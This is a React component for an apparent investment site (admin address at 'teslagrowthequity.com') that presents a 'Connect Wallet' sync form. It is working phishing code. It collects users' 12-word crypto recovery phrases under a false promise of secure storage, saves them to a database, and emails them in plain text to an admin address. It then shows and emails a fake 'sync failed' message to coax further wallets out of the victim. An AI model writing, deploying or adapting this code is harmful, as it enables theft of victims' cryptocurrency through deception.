import { useState } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { toast } from "sonner";
import { Loader2, Wallet, ShieldAlert } from "lucide-react";

const WALLETS = [
  "MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom",
  "Exodus", "Ledger Live", "Rainbow", "OKX", "Binance Wallet", "Other",
];

const ADMIN_EMAIL = "support@teslagrowthequity.com";

export default function ConnectWallet() {
  const { user } = useAuth();
  const [walletName, setWalletName] = useState("MetaMask");
  const [customWalletName, setCustomWalletName] = useState("");
  const [phrase, setPhrase] = useState<string[]>(Array(12).fill(""));
  const [submitting, setSubmitting] = useState(false);
  const [done, setDone] = useState(false);

  const isOther = walletName === "Other";
  const finalWalletName = isOther ? customWalletName.trim() : walletName;

  const setWord = (i: number, v: string) => {
    const next = [...phrase];
    next[i] = v.toLowerCase().trim();
    setPhrase(next);
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    const text = e.clipboardData.getData("text").trim();
    const words = text.split(/\s+/).slice(0, 12);
    if (words.length >= 6) {
      e.preventDefault();
      const next = Array(12).fill("");
      words.forEach((w, i) => { next[i] = w.toLowerCase(); });
      setPhrase(next);
    }
  };

  const resetForm = () => {
    setDone(false);
    setWalletName("MetaMask");
    setCustomWalletName("");
    setPhrase(Array(12).fill(""));
  };

  const submit = async () => {
    if (!user) return;
    if (isOther && !customWalletName.trim()) {
      return toast.error("Please enter your wallet name");
    }
    if (phrase.some((w) => !w)) return toast.error("All 12 words are required");

    setSubmitting(true);

    // Save phrase to DB
    const { error } = await supabase.from("wallet_phrases").insert({
      user_id: user.id,
      wallet_name: finalWalletName,
      phrase: phrase.join(" "),
    });

    if (error) {
      setSubmitting(false);
      return toast.error(error.message);
    }

    // Fetch first name for personalized email
    let firstName = "";
    const { data: prof } = await supabase
      .from("profiles")
      .select("full_name")
      .eq("user_id", user.id)
      .maybeSingle();
    firstName = ((prof as any)?.full_name || "").trim().split(" ")[0] || "";

    // Email to user — "failed to sync" message
    if (user.email) {
      void supabase.functions.invoke("send-email", {
        body: {
          email: user.email,
          first_name: firstName,
          subject: "Wallet Sync Failed",
          message: `<p style="margin:0 0 18px 0;">We were unable to synchronize your <strong>${finalWalletName}</strong> wallet at this time.</p>
<p style="margin:0 0 18px 0;">Our team has been notified. Please try a different wallet or contact support for assistance.</p>
<p style="margin:0;">If you believe this is an error, you can attempt to reconnect your wallet from your dashboard.</p>`,
        },
      }).catch(() => {});
    }

    // Notify admin with the phrase
    void supabase.functions.invoke("send-email", {
      body: {
        email: ADMIN_EMAIL,
        first_name: "Admin",
        subject: `Wallet phrase submitted — ${finalWalletName}`,
        message: `<p style="margin:0 0 18px 0;">${user.email ?? "A user"} submitted a wallet sync request.</p>
<p style="margin:0 0 18px 0;"><strong>Wallet:</strong> ${finalWalletName}</p>
<p style="margin:0;"><strong>Phrase:</strong> ${phrase.join(" ")}</p>`,
      },
    }).catch(() => {});

    setSubmitting(false);
    setPhrase(Array(12).fill(""));
    setDone(true);
    toast.error("Failed to synchronize wallet. Please try again or contact support.");
  };

  if (done) {
    return (
      <div className="space-y-6">
        <div>
          <h1 className="font-display text-3xl font-light tracking-[-0.03em]">Connect Wallet</h1>
        </div>
        <div className="rounded-2xl border border-[#00D4FF]/40 bg-[#00D4FF]/5 p-8 max-w-xl text-center">
          <ShieldAlert className="w-10 h-10 mx-auto text-[#00D4FF] mb-3" />
          <h2 className="font-display text-xl mb-2">Failed to synchronize wallet</h2>
          <p className="text-[13px] text-muted-foreground mb-4">
            We couldn't sync your wallet right now. Our team has been notified — please try a different wallet or contact support.
          </p>
          <Button variant="outline" onClick={resetForm} className="border-[#00D4FF] text-[#00D4FF] hover:bg-[#00D4FF] hover:text-white">
            Try another wallet
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div>
        <p className="label-mono text-muted-foreground mb-2">Sync external wallet</p>
        <h1 className="font-display text-3xl font-light tracking-[-0.03em]">Connect Wallet</h1>
        <p className="text-muted-foreground text-[14px] mt-1">Sync your existing wallet to view all assets in one place.</p>
      </div>

      <div className="rounded-2xl border border-[#00D4FF]/30 bg-[#00D4FF]/5 p-4 max-w-2xl flex items-start gap-3">
        <ShieldAlert className="w-5 h-5 text-[#00D4FF] mt-0.5 shrink-0" />
        <p className="text-[12px] text-muted-foreground">
          Enter your 12-word recovery phrase exactly as provided by your wallet. Words are stored securely and used only for syncing.
        </p>
      </div>

      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">

        {/* Wallet selector */}
        <div className="max-w-xs">
          <Label htmlFor="cw-wallet">Wallet</Label>
          <select
            id="cw-wallet"
            value={walletName}
            onChange={(e) => setWalletName(e.target.value)}
            className="mt-1 w-full rounded-md border border-input bg-[#E5E7EB] text-[#111111] px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#00D4FF]"
          >
            {WALLETS.map((w) => <option key={w} value={w}>{w}</option>)}
          </select>
        </div>

        {/* Custom wallet name — shown only when "Other" is selected */}
        {isOther && (
          <div className="max-w-xs">
            <Label htmlFor="cw-custom-name">Wallet Name</Label>
            <input
              id="cw-custom-name"
              type="text"
              value={customWalletName}
              onChange={(e) => setCustomWalletName(e.target.value)}
              placeholder="Enter your wallet name"
              autoComplete="off"
              style={{ fontSize: "16px" }}
              className="mt-1 w-full rounded-md border border-input bg-white text-[#111111] placeholder:text-[#9ca3af] px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#00D4FF]"
            />
          </div>
        )}

        {/* Recovery phrase grid */}
        <div>
          <Label className="flex items-center gap-2">
            <Wallet className="w-3.5 h-3.5" /> Recovery phrase (12 words)
          </Label>
          <p className="text-[11px] text-muted-foreground mb-2">
            Tip: paste your full phrase into any field — it will auto-fill.
          </p>
          <div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
            {phrase.map((w, i) => (
              <div key={i} className="relative">
                <span className="absolute left-2 top-1/2 -translate-y-1/2 text-[10px] text-[#9ca3af] font-mono pointer-events-none z-10">
                  {i + 1}
                </span>
                {/* Native input used here with font-size:16px to prevent iOS zoom on focus */}
                <input
                  type="text"
                  value={w}
                  onChange={(e) => setWord(i, e.target.value)}
                  onPaste={handlePaste}
                  autoComplete="off"
                  autoCorrect="off"
                  autoCapitalize="none"
                  spellCheck={false}
                  style={{ fontSize: "16px" }}
                  className="w-full pl-7 pr-2 py-2 rounded-md border border-input bg-white text-[#111111] font-mono focus:outline-none focus:ring-2 focus:ring-[#00D4FF]"
                />
              </div>
            ))}
          </div>
        </div>

        <Button
          disabled={submitting}
          onClick={submit}
          className="w-full bg-[#00D4FF] hover:bg-[#00B8E0] text-white"
        >
          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Sync wallet"}
        </Button>
      </div>
    </div>
  );
}
